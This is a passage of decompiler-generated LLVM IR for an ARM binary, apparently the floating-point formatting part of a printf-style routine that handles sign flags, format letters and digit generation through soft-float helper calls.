  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp182 = ptrtoint i32* %arg4 to i32
  store i32 %tmp182, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v3_16588 = load i32, i32* @r4, align 4
  %v6_16588 = load i32, i32* @r5, align 4
  %v9_16588 = load i32, i32* @r6, align 4
  %v12_16588 = load i32, i32* @r7, align 4
  %v27_16588 = load i32, i32* @lr, align 4
  store i32 %tmp182, i32* %r1.global-to-local, align 4
  %v1_16594 = add i32 %tmp182, 8
  %v2_16594 = inttoptr i32 %v1_16594 to i8*
  %v3_16594 = load i8, i8* %v2_16594, align 1
  %v4_16594 = zext i8 %v3_16594 to i32
  store i32 %v4_16594, i32* %sb.global-to-local, align 4
  %v1_16598 = or i32 %v4_16594, 32
  %v7_1659c = icmp eq i32 %v1_16598, 97
  store i1 %v7_1659c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp182, i32* %r0.global-to-local, align 4
  store i32 %tmp182, i32* %r1.global-to-local, align 4
  %v2_165b4 = load i32, i32* %arg4, align 4
  store i32 %v2_165b4, i32* %fp.global-to-local, align 4
  store i32 %tmp182, i32* %lr.global-to-local, align 4
  %v0_165bc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_165bc, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_cdd0.463 to i32), i32* %ip.global-to-local, align 4
  br i1 %v7_1659c, label %bb, label %bb197

bb:                                               ; preds = %dec_label_pc_16588
  %v2_165c4 = add nuw nsw i32 %v4_16594, 6
  store i32 %v2_165c4, i32* %r3.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_16588, %bb
  %v1_165d4 = phi i32 [ %v0_165bc, %dec_label_pc_16588 ], [ %v2_165c4, %bb ]
  store i32 %arg2, i32* @r5, align 4
  %v1_165cc = add i32 %tmp182, 12
  %v2_165cc = inttoptr i32 %v1_165cc to i32*
  %v3_165cc = load i32, i32* %v2_165cc, align 4
  store i32 %v3_165cc, i32* %r2.global-to-local, align 4
  %v1_165d0 = add i32 %tmp182, 4
  %v2_165d0 = inttoptr i32 %v1_165d0 to i32*
  %v3_165d0 = load i32, i32* %v2_165d0, align 4
  store i32 %v3_165d0, i32* @lr, align 4
  br i1 %v7_1659c, label %bb198, label %bb199

bb198:                                            ; preds = %bb197
  %v2_165d4 = urem i32 %v1_165d4, 256
  store i32 %v2_165d4, i32* %sb.global-to-local, align 4
  br label %bb199

bb199:                                            ; preds = %bb197, %bb198
  %v1_165d8 = icmp slt i32 %v2_165b4, 0
  %v2_165d8 = icmp eq i32 %v2_165b4, 0
  store i1 %v2_165d8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_cdd0.463 to i32), i32 91624), i32* %ip.global-to-local, align 4
  br i1 %v1_165d8, label %bb200, label %bb201

bb200:                                            ; preds = %bb199
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %bb199, %bb200
  %v1_165e8 = and i32 %v3_165cc, 2
  %v2_165e8 = icmp eq i32 %v1_165e8, 0
  store i1 %v2_165e8, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_165e8, label %dec_label_pc_16600, label %dec_label_pc_1660c

dec_label_pc_16600:                               ; preds = %bb201
  %v1_16600 = urem i32 %v3_165cc, 2
  %v2_16600 = icmp eq i32 %v1_16600, 0
  store i1 %v2_16600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16600, label %dec_label_pc_16610, label %dec_label_pc_1660c

dec_label_pc_1660c:                               ; preds = %dec_label_pc_16600, %bb201
  %storemerge = phi i32 [ 43, %bb201 ], [ 32, %dec_label_pc_16600 ]
  %v0_1660c.off0 = phi i8 [ 43, %bb201 ], [ 32, %dec_label_pc_16600 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_1660c.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_16610

dec_label_pc_16610:                               ; preds = %dec_label_pc_16600, %dec_label_pc_1660c
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_165bc, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r0, align 4
  store i32 %v0_165bc, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v5_1662c = call i32 @function_19770(i32 %arg2, i32 %v0_165bc, i32 %arg2, i32 %v0_165bc, i32 0)
  store i32 %v5_1662c, i32* %r0.global-to-local, align 4
  %v2_16630 = icmp eq i32 %v5_1662c, 0
  store i1 %v2_16630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16630, label %bb203, label %dec_label_pc_16640

bb203:                                            ; preds = %dec_label_pc_16610
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_166f4

dec_label_pc_16640:                               ; preds = %dec_label_pc_16610
  %v0_16640 = load i32, i32* @r5, align 4
  store i32 %v0_16640, i32* @r0, align 4
  %v0_16644 = load i32, i32* @r6, align 4
  store i32 %v0_16644, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_16650 = call i32 @function_19770(i32 %v0_16640, i32 %v0_16644, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_16650, i32* %r0.global-to-local, align 4
  %v2_16654 = icmp eq i32 %v5_16650, 0
  store i1 %v2_16654, i1* %cpsr_z.global-to-local, align 1
  %v0_1669c = load i32, i32* @r5, align 4
  br i1 %v2_16654, label %dec_label_pc_1669c, label %dec_label_pc_1665c

dec_label_pc_1665c:                               ; preds = %dec_label_pc_16640
  store i32 %v0_1669c, i32* %r2.global-to-local, align 4
  %v0_16660 = load i32, i32* @r6, align 4
  store i32 %v0_16660, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v4_1666c = call i32 @function_1949c(i32 0, i32 1072693248, i32 %v0_1669c, i32 %v0_16660)
  store i32 %v4_1666c, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_16678 = call i32 @function_19788(i32 %v4_1666c)
  store i32 %v1_16678, i32* %r0.global-to-local, align 4
  %v2_1667c = icmp eq i32 %v1_16678, 0
  store i1 %v2_1667c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1667c, label %bb204, label %dec_label_pc_16688

bb204:                                            ; preds = %dec_label_pc_1665c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16868

dec_label_pc_16688:                               ; preds = %dec_label_pc_1665c
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_16868

dec_label_pc_1669c:                               ; preds = %dec_label_pc_16640
  store i32 %v0_1669c, i32* @r0, align 4
  %v0_166a0 = load i32, i32* @r6, align 4
  store i32 %v0_166a0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_166ac = call i32 @function_19788(i32 %v0_1669c)
  store i32 %v4_166ac, i32* %r0.global-to-local, align 4
  %v2_166b0 = icmp eq i32 %v4_166ac, 0
  store i1 %v2_166b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_166b0, label %dec_label_pc_1669c..thread9_crit_edge, label %bb205

dec_label_pc_1669c..thread9_crit_edge:            ; preds = %dec_label_pc_1669c
  %v0_166d0.pre = load i32, i32* @r6, align 4
  br label %.thread9

bb205:                                            ; preds = %dec_label_pc_1669c
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_166b8 = load i32, i32* @r6, align 4
  %v2_166b8 = sub i32 0, %v1_166b8
  store i32 %v2_166b8, i32* @r4, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_166b8, i32* @r6, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1669c..thread9_crit_edge, %bb205
  %v0_166d0 = phi i32 [ %v0_166d0.pre, %dec_label_pc_1669c..thread9_crit_edge ], [ %v2_166b8, %bb205 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1070596096, i32* %r3.global-to-local, align 4
  %v0_166cc = load i32, i32* @r5, align 4
  store i32 %v0_166cc, i32* %r0.global-to-local, align 4
  store i32 %v0_166d0, i32* %r1.global-to-local, align 4
  %v4_166d4 = sext i32 %v0_166cc to i64
  %v5_166d4 = call i32 @function_1920c(i64 %v4_166d4, i32 %v0_166d0, i32 0, i32 1070596096)
  store i32 %v5_166d4, i32* %r2.global-to-local, align 4
  store i32 %v0_166d0, i32* %r3.global-to-local, align 4
  %v0_166e0 = load i32, i32* @r5, align 4
  store i32 %v0_166e0, i32* @r0, align 4
  %v0_166e4 = load i32, i32* @r6, align 4
  store i32 %v0_166e4, i32* %r1.global-to-local, align 4
  %v5_166e8 = call i32 @function_19770(i32 %v0_166e0, i32 %v0_166e4, i32 %v5_166d4, i32 %v0_166d0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_166e8, i32* %r0.global-to-local, align 4
  %v2_166ec = icmp eq i32 %v5_166e8, 0
  store i1 %v2_166ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_166ec, label %dec_label_pc_16740, label %.thread9.dec_label_pc_166f4_crit_edge

.thread9.dec_label_pc_166f4_crit_edge:            ; preds = %.thread9
  %v3_166f4.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_166f4

dec_label_pc_166f4:                               ; preds = %bb203, %.thread9.dec_label_pc_166f4_crit_edge
  %v3_166f4 = phi i32 [ %v3_166f4.pre, %.thread9.dec_label_pc_166f4_crit_edge ], [ %tmp182, %bb203 ]
  %v1_16638.v0_166245 = phi i32 [ 0, %.thread9.dec_label_pc_166f4_crit_edge ], [ 8, %bb203 ]
  store i32 %v3_166f4, i32* %ip.global-to-local, align 4
  %v2_166fc = add i32 %v3_166f4, 16
  %v3_166fc = inttoptr i32 %v2_166fc to i32*
  store i32 32, i32* %v3_166fc, align 4
  %v0_16704 = load i32, i32* %sb.global-to-local, align 4
  %v7_16704 = icmp eq i32 %v0_16704, 96
  store i1 %v7_16704, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp = icmp ult i32 %v0_16704, 97
  br i1 %tmp, label %bb206, label %.thread121

bb206:                                            ; preds = %dec_label_pc_166f4
  %v5_16718 = or i32 %v1_16638.v0_166245, 4
  store i32 %v5_16718, i32* %r3.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_166f4, %bb206
  %v4_1671c = phi i32 [ %v5_16718, %bb206 ], [ 3, %dec_label_pc_166f4 ]
  %v4_1671c.v1_16638.v0_16624 = select i1 %tmp, i32 %v4_1671c, i32 %v1_16638.v0_166245
  store i32 add (i32 ptrtoint (i32* @global_var_cdd0.463 to i32), i32 91624), i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1b320.467 to i32), i32* %r3.global-to-local, align 4
  %v2_16730 = add i32 %v4_1671c.v1_16638.v0_16624, ptrtoint ([4 x i8]* @global_var_1b320.467 to i32)
  store i32 %v2_16730, i32* %r2.global-to-local, align 4
  %v2_16734 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_16734, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16c5c

dec_label_pc_16740:                               ; preds = %.thread9
  %v0_16740 = load i32, i32* @r6, align 4
  store i32 %v0_16740, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_16748 = load i32, i32* @r5, align 4
  store i32 %v0_16748, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_16750 = call i32 @function_19788(i32 %v0_16748)
  store i32 %v4_16750, i32* %r0.global-to-local, align 4
  %v2_16754 = icmp eq i32 %v4_16750, 0
  store i1 %v2_16754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16754, label %bb208, label %bb207

bb207:                                            ; preds = %dec_label_pc_16740
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb208

bb208:                                            ; preds = %dec_label_pc_16740, %bb207
  %v0_1675c = phi i32 [ 0, %dec_label_pc_16740 ], [ 1, %bb207 ]
  store i32 add (i32 ptrtoint (i32* @global_var_cdd0.463 to i32), i32 91624), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b338.470 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b338.470 to i32), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* @r4, align 4
  %v2_16790 = icmp eq i32 %v0_1675c, 0
  br label %dec_label_pc_16780

dec_label_pc_16780:                               ; preds = %dec_label_pc_16818.dec_label_pc_16780_crit_edge, %bb208
  %v2_16788 = phi i32 [ ptrtoint (i32* @global_var_1b338.470 to i32), %bb208 ], [ %v2_16788.pre, %dec_label_pc_16818.dec_label_pc_16780_crit_edge ]
  %v0_16784 = phi i32 [ 9, %bb208 ], [ %v0_16818, %dec_label_pc_16818.dec_label_pc_16780_crit_edge ]
  %v2_167c8 = phi i32 [ 8, %bb208 ], [ %stack_var_-192.3, %dec_label_pc_16818.dec_label_pc_16780_crit_edge ]
  store i32 %v0_1675c, i32* %r2.global-to-local, align 4
  %v1_16784 = add i32 %v0_16784, -1
  store i32 %v1_16784, i32* %sl.global-to-local, align 4
  store i32 %v2_16788, i32* @lr, align 4
  %v3_1678c = mul i32 %v1_16784, 8
  store i32 %v3_1678c, i32* %r3.global-to-local, align 4
  store i1 %v2_16790, i1* %cpsr_z.global-to-local, align 1
  %v0_16794 = load i32, i32* @r5, align 4
  store i32 %v0_16794, i32* %r0.global-to-local, align 4
  %v0_16798 = load i32, i32* @r6, align 4
  store i32 %v0_16798, i32* %r1.global-to-local, align 4
  %v2_1679c = add i32 %v3_1678c, %v2_16788
  store i32 %v2_1679c, i32* %ip.global-to-local, align 4
  %v1_167d8 = inttoptr i32 %v2_1679c to i32*
  %v2_167d8 = load i32, i32* %v1_167d8, align 4
  store i32 %v2_167d8, i32* %r2.global-to-local, align 4
  %v3_167d8 = add i32 %v2_1679c, 4
  %v4_167d8 = inttoptr i32 %v3_167d8 to i32*
  %v5_167d8 = load i32, i32* %v4_167d8, align 4
  store i32 %v5_167d8, i32* %r3.global-to-local, align 4
  br i1 %v2_16790, label %dec_label_pc_167d8, label %dec_label_pc_167a4

dec_label_pc_167a4:                               ; preds = %dec_label_pc_16780
  %v4_167a8 = sext i32 %v0_16794 to i64
  %v5_167a8 = call i32 @function_1920c(i64 %v4_167a8, i32 %v0_16798, i32 %v2_167d8, i32 %v5_167d8)
  store i32 %v5_167a8, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v5_167a8, i32* %r7.global-to-local, align 4
  store i32 %v0_16798, i32* %r8.global-to-local, align 4
  %v1_167bc = call i32 @function_19788(i32 %v5_167a8)
  store i32 %v1_167bc, i32* %r0.global-to-local, align 4
  %v2_167c0 = icmp eq i32 %v1_167bc, 0
  store i1 %v2_167c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_167c0, label %dec_label_pc_16818, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_167a4
  %v1_167c8 = load i32, i32* @r4, align 4
  %v3_167c8 = sub i32 %v2_167c8, %v1_167c8
  store i32 %v3_167c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16810

dec_label_pc_167d8:                               ; preds = %dec_label_pc_16780
  store i32 %v0_16794, i32* %r0.global-to-local, align 4
  store i32 %v0_16798, i32* %r1.global-to-local, align 4
  %v4_167e4 = call i32 @function_1949c(i32 %v0_16794, i32 %v0_16798, i32 %v2_167d8, i32 %v5_167d8)
  store i32 %v4_167e4, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v4_167e4, i32* %r7.global-to-local, align 4
  store i32 %v0_16798, i32* %r8.global-to-local, align 4
  %v4_167f8 = call i32 @function_197b8(i32 %v4_167e4, i32 %v0_16798, i32 0, i32 1100470148)
  store i32 %v4_167f8, i32* %r0.global-to-local, align 4
  %v2_167fc = icmp eq i32 %v4_167f8, 0
  store i1 %v2_167fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_167fc, label %dec_label_pc_16818, label %dec_label_pc_16804

dec_label_pc_16804:                               ; preds = %dec_label_pc_167d8
  %v1_16808 = load i32, i32* @r4, align 4
  %v2_16808 = add i32 %v1_16808, %v2_167c8
  store i32 %v2_16808, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16810

dec_label_pc_16810:                               ; preds = %.thread10, %dec_label_pc_16804
  %stack_var_-192.2 = phi i32 [ %v2_16808, %dec_label_pc_16804 ], [ %v3_167c8, %.thread10 ]
  %v0_16810 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16810, i32* @r5, align 4
  %v0_16814 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_16814, i32* @r6, align 4
  br label %dec_label_pc_16818

dec_label_pc_16818:                               ; preds = %dec_label_pc_167a4, %dec_label_pc_167d8, %dec_label_pc_16810
  %stack_var_-192.3 = phi i32 [ %v2_167c8, %dec_label_pc_167d8 ], [ %stack_var_-192.2, %dec_label_pc_16810 ], [ %v2_167c8, %dec_label_pc_167a4 ]
  %v0_16818 = load i32, i32* %sl.global-to-local, align 4
  %v2_16818 = icmp eq i32 %v0_16818, 0
  store i1 %v2_16818, i1* %cpsr_z.global-to-local, align 1
  %v0_1681c = load i32, i32* @r4, align 4
  %v3_1681c = sdiv i32 %v0_1681c, 2
  store i32 %v3_1681c, i32* @r4, align 4
  br i1 %v2_16818, label %dec_label_pc_16824, label %dec_label_pc_16818.dec_label_pc_16780_crit_edge

dec_label_pc_16818.dec_label_pc_16780_crit_edge:  ; preds = %dec_label_pc_16818
  %v2_16788.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_16780

dec_label_pc_16824:                               ; preds = %dec_label_pc_16818
  %v0_16824 = load i32, i32* @r5, align 4
  store i32 %v0_16824, i32* @r0, align 4
  %v0_16828 = load i32, i32* @r6, align 4
  store i32 %v0_16828, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v4_16834 = call i32 @function_197b8(i32 %v0_16824, i32 %v0_16828, i32 0, i32 1104006501)
  store i32 %v4_16834, i32* %r0.global-to-local, align 4
  %v2_16838 = icmp eq i32 %v4_16834, 0
  store i1 %v2_16838, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16838, label %dec_label_pc_16868, label %dec_label_pc_16840

dec_label_pc_16840:                               ; preds = %dec_label_pc_16824
  %v0_16840 = load i32, i32* @r5, align 4
  store i32 %v0_16840, i32* %r0.global-to-local, align 4
  %v0_16844 = load i32, i32* @r6, align 4
  store i32 %v0_16844, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v4_16850 = call i32 @function_1949c(i32 %v0_16840, i32 %v0_16844, i32 0, i32 1076101120)
  store i32 %v4_16850, i32* %r0.global-to-local, align 4
  store i32 %v4_16850, i32* @r5, align 4
  store i32 %v0_16844, i32* @r6, align 4
  %v1_16860 = add i32 %stack_var_-192.3, 1
  store i32 %v1_16860, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16868

dec_label_pc_16868:                               ; preds = %dec_label_pc_16840, %bb204, %dec_label_pc_16824, %dec_label_pc_16688
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_16824 ], [ -1, %dec_label_pc_16688 ], [ -1, %bb204 ], [ %v1_16860, %dec_label_pc_16840 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1686c = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_1686c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16870

dec_label_pc_16870:                               ; preds = %dec_label_pc_168e8, %dec_label_pc_16868
  %v0_16870 = load i32, i32* @r6, align 4
  store i32 %v0_16870, i32* %r1.global-to-local, align 4
  %v0_16874 = load i32, i32* @r5, align 4
  store i32 %v0_16874, i32* %r0.global-to-local, align 4
  %v2_16878 = call i32 @function_197e8(i32 %v0_16874, i32 %v0_16870)
  store i32 %v2_16878, i32* @r0, align 4
  store i32 %v2_16878, i32* %r8.global-to-local, align 4
  %v0_16880 = call i32 @function_1910c()
  store i32 %v0_16880, i32* %r2.global-to-local, align 4
  store i32 %v0_16870, i32* %r3.global-to-local, align 4
  %v0_1688c = load i32, i32* @r5, align 4
  store i32 %v0_1688c, i32* @r0, align 4
  %v0_16890 = load i32, i32* @r6, align 4
  store i32 %v0_16890, i32* %r1.global-to-local, align 4
  %v4_16894 = call i32 @function_18df8(i32 %v0_1688c, i32 %v0_16890, i32 %v0_16880, i32 %v0_16870)
  store i32 %v4_16894, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v4_168a0 = sext i32 %v4_16894 to i64
  %v5_168a0 = call i32 @function_1920c(i64 %v4_168a0, i32 %v0_16890, i32 0, i32 1104006501)
  store i32 %v5_168a0, i32* %r0.global-to-local, align 4
  %v0_168a4 = load i32, i32* %sl.global-to-local, align 4
  %v1_168a4 = add i32 %v0_168a4, 9
  store i32 %v1_168a4, i32* %sl.global-to-local, align 4
  store i32 %v5_168a0, i32* @r5, align 4
  store i32 %v0_16890, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v0_168b4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_168b4

dec_label_pc_168b4:                               ; preds = %dec_label_pc_168b4, %dec_label_pc_16870
  %v0_168b4 = phi i32 [ %v0_168d8, %dec_label_pc_168b4 ], [ %v0_168b4.pre, %dec_label_pc_16870 ]
  store i32 %v0_168b4, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_168bc = call i32 @function_103c8(i32 %v0_168b4, i32 10)
  %v0_168c0 = load i32, i32* @r7, align 4
  %v1_168c0 = add i32 %v0_168c0, 1
  store i32 %v1_168c0, i32* @r7, align 4
  store i32 58, i32* %r2.global-to-local, align 4
  %v1_168c8 = load i32, i32* %sl.global-to-local, align 4
  %v2_168c8 = sub i32 %v1_168c8, %v1_168c0
  store i32 %v2_168c8, i32* @r3, align 4
  %v0_168cc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_168cc, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v3_168d4 = inttoptr i32 %v2_168c8 to i8*
  store i8 58, i8* %v3_168d4, align 1
  %v0_168d8 = call i32 @function_102cc()
  store i32 %v0_168d8, i32* %r0.global-to-local, align 4
  %v0_168dc = load i32, i32* @r7, align 4
  %v7_168dc = icmp eq i32 %v0_168dc, 8
  store i1 %v7_168dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_168d8, i32* %r8.global-to-local, align 4
  %v7_168e4 = icmp slt i32 %v0_168dc, 9
  br i1 %v7_168e4, label %dec_label_pc_168b4, label %dec_label_pc_168e8

dec_label_pc_168e8:                               ; preds = %dec_label_pc_168b4
  %v0_168e8 = load i32, i32* @r4, align 4
  %v1_168e8 = add i32 %v0_168e8, 1
  store i32 %v1_168e8, i32* %r4.global-to-local, align 4
  %v7_168ec = icmp eq i32 %v0_168e8, 0
  store i1 %v7_168ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_168ec, label %dec_label_pc_16870, label %dec_label_pc_168f4

dec_label_pc_168f4:                               ; preds = %dec_label_pc_168e8
  %v0_168f4 = load i32, i32* %sb.global-to-local, align 4
  %v7_168f4 = icmp eq i32 %v0_168f4, 96
  store i1 %v7_168f4, i1* %cpsr_z.global-to-local, align 1
  %tmp270 = icmp ult i32 %v0_168f4, 97
  br i1 %tmp270, label %bb209, label %thread-pre-split

bb209:                                            ; preds = %dec_label_pc_168f4
  %v5_16904 = add i32 %v0_168f4, 32
  store i32 %v5_16904, i32* %r3.global-to-local, align 4
  %v5_16908 = urem i32 %v5_16904, 256
  store i32 %v5_16908, i32* %sb.global-to-local, align 4
  br label %bb210

thread-pre-split:                                 ; preds = %dec_label_pc_168f4
  %v4_16900.pre126131 = load i32, i32* @r3, align 4
  %phitmp = urem i32 %v4_16900.pre126131, 256
  br label %bb210

bb210:                                            ; preds = %thread-pre-split, %bb209
  %v4_16900123127 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb209 ]
  %v0_16928 = phi i32 [ %v0_168f4, %thread-pre-split ], [ %v5_16908, %bb209 ]
  %v7_1690c = icmp eq i32 %v0_16928, 103
  %. = zext i1 %v7_1690c to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_16918 = load i32, i32* %fp.global-to-local, align 4
  %v2_16918 = icmp eq i32 %v0_16918, 0
  store i1 %v2_16918, i1* %cpsr_z.global-to-local, align 1
  %tmp213 = icmp slt i32 %v0_16918, 1
  br i1 %tmp213, label %.thread16, label %bb214

.thread16:                                        ; preds = %bb210
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb216

bb214:                                            ; preds = %bb210
  %v2_16920 = icmp eq i1 %v7_1690c, false
  store i1 %v2_16920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16920, label %bb216, label %bb215

bb215:                                            ; preds = %bb214
  %v2_16924 = add i32 %v0_16918, -1
  store i32 %v2_16924, i32* %fp.global-to-local, align 4
  br label %bb216

bb216:                                            ; preds = %.thread16, %bb214, %bb215
  %v0_16938 = phi i32 [ %v0_16918, %.thread16 ], [ %v0_16918, %bb214 ], [ %v2_16924, %bb215 ]
  %v7_16928 = icmp eq i32 %v0_16928, 102
  store i1 %v7_16928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16928, label %dec_label_pc_16934, label %bb217

bb217:                                            ; preds = %bb216
  store i32 %v0_16938, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1695c

dec_label_pc_16934:                               ; preds = %bb216
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_16938 = add i32 %v0_16938, %stack_var_-192.4
  store i32 %v2_16938, i32* %ip.global-to-local, align 4
  %v8_1693c = icmp eq i32 %v2_16938, -1
  store i1 %v8_1693c, i1* %cpsr_z.global-to-local, align 1
  %v6_16940 = icmp slt i32 %v2_16938, -1
  br i1 %v6_16940, label %dec_label_pc_16944, label %dec_label_pc_1695c

dec_label_pc_16944:                               ; preds = %dec_label_pc_16934
  %v2_16944 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_16944, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_16950 = bitcast i32* %stack_var_-83 to i8*
  %v3_16950 = call i32 @function_11f30(i8* %v2_16950, i32 48)
  store i32 %v3_16950, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1695c

dec_label_pc_1695c:                               ; preds = %bb217, %dec_label_pc_16934, %dec_label_pc_16944
  %v1_169a090 = phi i32 [ %v3_16950, %dec_label_pc_16944 ], [ %v0_168d8, %dec_label_pc_16934 ], [ %v0_168d8, %bb217 ]
  %v1_16984 = phi i32 [ -1, %dec_label_pc_16944 ], [ %v2_16938, %dec_label_pc_16934 ], [ %v0_16938, %bb217 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_16944 ], [ %stack_var_-192.4, %dec_label_pc_16934 ], [ %stack_var_-192.4, %bb217 ]
  %v1_16960 = add i32 %v1_16984, -16
  %v3_16960 = sub i32 15, %v1_16984
  %v4_16960 = and i32 %v3_16960, %v1_16984
  %v5_16960 = icmp slt i32 %v4_16960, 0
  %v6_16960 = icmp slt i32 %v1_16960, 0
  %v7_16960 = icmp eq i32 %v1_16984, 16
  store i1 %v7_16960, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_1696c = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_1696c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_16974 = xor i1 %v6_16960, %v5_16960
  %v4_16974 = or i1 %v7_16960, %v3_16974
  br i1 %v4_16974, label %dec_label_pc_16980, label %.thread137

.thread137:                                       ; preds = %dec_label_pc_1695c
  %v7_16974134138 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_16974134138, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_16980:                               ; preds = %dec_label_pc_1695c
  %v2_16980 = ptrtoint i32* %stack_var_-82 to i32
